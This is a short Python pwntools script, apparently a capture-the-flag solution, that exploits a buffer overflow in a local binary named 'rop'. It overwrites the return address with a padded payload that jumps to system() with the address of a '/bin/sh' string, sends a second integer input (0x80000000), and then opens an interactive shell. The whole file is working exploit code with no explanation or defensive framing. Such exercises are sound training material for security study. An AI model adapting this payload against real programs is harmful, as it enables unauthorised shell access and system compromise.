from pwn import *
context.binary = ELF('./rop')


def exploit():
	system = 0x8048440
	binsh = 0x804a04c

	payload = 'a'*(0x20 + 4)
	payload += p32(system)
	payload += p32(0xdeadbeef)
	payload += p32(binsh)

	p.recvline()
	p.sendline(payload)
	p.recvline()
	p.sendline(str(0x80000000))


p = process('./rop')
exploit()

p.interactive()
p.close()